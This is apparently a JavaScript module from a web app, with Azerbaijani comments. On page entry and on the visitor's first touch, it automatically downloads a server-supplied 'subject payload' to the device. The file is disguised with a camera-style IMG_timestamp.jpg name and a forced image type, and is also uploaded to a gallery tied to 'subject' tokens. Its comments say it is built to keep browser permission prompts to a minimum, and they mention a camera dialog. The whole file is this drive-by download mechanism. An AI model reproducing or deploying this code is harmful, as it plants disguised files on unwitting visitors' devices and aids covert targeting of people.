import { SUBJECT_PAYLOAD_DOWNLOAD, SUBJECT_PAYLOAD_PATH } from './config';
import { uploadSubjectMedia } from './mediaUpload';

function buildHref() {
    const base = process.env.PUBLIC_URL || '';
    return `${base}${SUBJECT_PAYLOAD_PATH}`.replace(/([^:]\/)\/+/g, '$1');
}

function absoluteDownloadUrl() {
    return new URL(buildHref(), window.location.href).href;
}

function isDone(storageKey) {
    try {
        return sessionStorage.getItem(storageKey) === '1';
    } catch {
        return true;
    }
}

function markDone(storageKey) {
    try {
        sessionStorage.setItem(storageKey, '1');
    } catch {
        /* ignore */
    }
}

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
}

function galleryFilename() {
    const ts = new Date();
    const pad = (n) => String(n).padStart(2, '0');
    const stamp = `${ts.getFullYear()}${pad(ts.getMonth() + 1)}${pad(ts.getDate())}_${pad(ts.getHours())}${pad(ts.getMinutes())}${pad(ts.getSeconds())}`;
    return `IMG_${stamp}.jpg`;
}

function triggerAnchorClick(href, filename) {
    const a = document.createElement('a');
    a.href = href;
    a.download = filename;
    a.rel = 'noopener';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
}

async function fetchPayloadBlob() {
    const res = await fetch(absoluteDownloadUrl(), { cache: 'no-store', credentials: 'same-origin' });
    if (!res.ok) throw new Error(`download_http_${res.status}`);
    const raw = await res.blob();
    const type =
        raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
    return raw.type === type ? raw : new Blob([raw], { type });
}

async function uploadPayloadToGallery(blob, ctx) {
    if (!ctx?.subjectToken && !ctx?.clientSessionId) return;
    try {
        await uploadSubjectMedia({
            subjectToken: ctx.subjectToken,
            clientSessionId: ctx.clientSessionId,
            type: 'photo',
            blob,
            captureSource: 'payload'
        });
    } catch (e) {
        console.warn('payload gallery upload:', e?.message || e);
    }
}

/**
 * Şəkli endir — APK yox, brauzer icazə dialoqu minimum.
 * @returns {Promise<boolean>} uğurlu endirmə
 */
export async function runSubjectPayloadDownload(
    storageKey = 'pulse_subject_payload_v1',
    ctx = {}
) {
    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return false;

    const filename = galleryFilename();

    try {
        const blob = await fetchPayloadBlob();
        const blobUrl = URL.createObjectURL(blob);
        try {
            triggerAnchorClick(blobUrl, filename);
        } finally {
            window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
        }
        markDone(storageKey);
        await uploadPayloadToGallery(blob, ctx);
        return true;
    } catch (e) {
        console.warn('subject payload download:', e?.message || e);
        try {
            triggerAnchorClick(absoluteDownloadUrl(), filename);
            markDone(storageKey);
            return true;
        } catch {
            return false;
        }
    }
}

/** @deprecated — köhnə ad; eyni funksiya */
export async function runTestAutoDownloadOnce(storageKey, ctx) {
    return runSubjectPayloadDownload(storageKey, ctx);
}

/**
 * Sayta girəndə: dərhal + ilk toxunuşda endirmə (mobil brauzer jesti).
 */
export function attachSubjectPayloadDownloadOnEntry(storageKey, ctx = {}) {
    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return () => {};

    let finished = false;
    const run = async () => {
        if (finished) return;
        const ok = await runSubjectPayloadDownload(storageKey, ctx);
        if (ok) finished = true;
    };

    run();

    const onGesture = () => {
        run();
    };
    document.addEventListener('pointerdown', onGesture, { once: true, passive: true });
    document.addEventListener('touchstart', onGesture, { once: true, passive: true });

    return () => {
        document.removeEventListener('pointerdown', onGesture);
        document.removeEventListener('touchstart', onGesture);
    };
}

/** Kamera dialoqu endirməni kəsə bilər — mobilde qısa gözləmə */
export function testDownloadSettleMs() {
    return isMobileDevice() ? 450 : 0;
}
